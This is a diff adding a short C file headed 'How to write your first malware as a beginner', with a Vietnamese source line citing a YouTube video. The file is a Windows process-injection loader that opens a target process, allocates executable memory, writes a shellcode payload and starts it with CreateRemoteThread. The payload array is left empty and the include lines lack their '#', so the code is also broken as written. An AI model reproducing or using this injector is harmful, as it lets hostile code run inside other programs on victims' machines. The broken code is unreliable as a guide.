@@ -1,0 +1,44 @@
+
+NGUỒN : https://www.youtube.com/watch?v=oJMvS1Ivg_E&t=57s
+How to write your first malware as a beginner
+
+#define _CRT_SECURE_NO_WARNINGS
+
+include <Windows.h>
+include <stdio.h>
+
+int main(){
+    unsigned char payload[] = 
+
+    DWORD PID = NULL;
+    printf("PID : ");
+    scanf("%d", &PID);
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+    if (hProcess == NULL){
+        printf("[-] ERROR OpenProcess");
+        return 1;
+    }
+
+    LPVOID buffer = VirtualAllocEx(hProcess, NULL, sizeof(payload) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if(buffer == NULL) {
+        printf("[ - ] ERROR VirtualAllocEx");
+        return 1;
+    }
+
+    if(!WriteProcessMemory(hProcess, buffer, payload, sizeof(payload), NULL)){
+        printf("[ - ] ERROR WriteProcessMemory");
+        return 1;
+    }
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
+
+    if (hThread == NULL){
+        printf("[-] ERROR CreateRemoteThread");
+        return 1;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    return 0;
+}
